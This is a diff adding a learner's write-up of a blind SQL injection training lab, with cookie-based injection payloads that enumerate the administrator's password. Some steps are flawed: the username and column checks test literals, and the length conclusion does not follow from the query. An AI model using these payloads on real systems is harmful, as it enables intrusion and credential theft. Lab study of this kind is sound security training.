@@ -1,0 +1,55 @@
+
+Lab: Blind SQL injection with conditional responses
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+STEPS:
+#1
+Confirme that the parameter is vulnerable to SQLi
+
+In the backend we can imagine that the SQL query looks like this:
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA'
+
+so if we send a request with a valide tracking_id, we should have a welcome back msg.
+If it doesn't exist what happen? :
+we have a page without the welcome back msg but it doesn't crash.
+
+So now we have to enforce a TRUE case and a FALSE case to see if we can exploit SQLi.
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA' and 1=1--'  => will always be TRUE
+KeSEEGz0q9k5AkoA' and 1=1--'
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA' and 1=2--'  => will always be FALSE
+KeSEEGz0q9k5AkoA' and 1=2--'
+
+#2
+Confirme that we have a users table
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA
+' and (select 'x' from users LIMIT 1)='x'--'
+users table exists in the database
+
+#3
+Confirme that the username administrator exists in the db
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA
+' and (select 'administrator' from users LIMIT 1)='administrator'--'
+
+#4
+Confirme that the username password exists in the db
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA
+' and (select 'password' from users LIMIT 1)='password'--'
+
+
+#5
+find the length of the password:
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA
+' and (select username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--'
+-> password is exactly 20 char long
+
+#6
+Enumarate the password of the administrator user:
+SELECT tracking_id FROM tracking_table where trackingId = 'KeSEEGz0q9k5AkoA
+' and (select substring(password,1,1) from users WHERE username='administrator')='a'--'
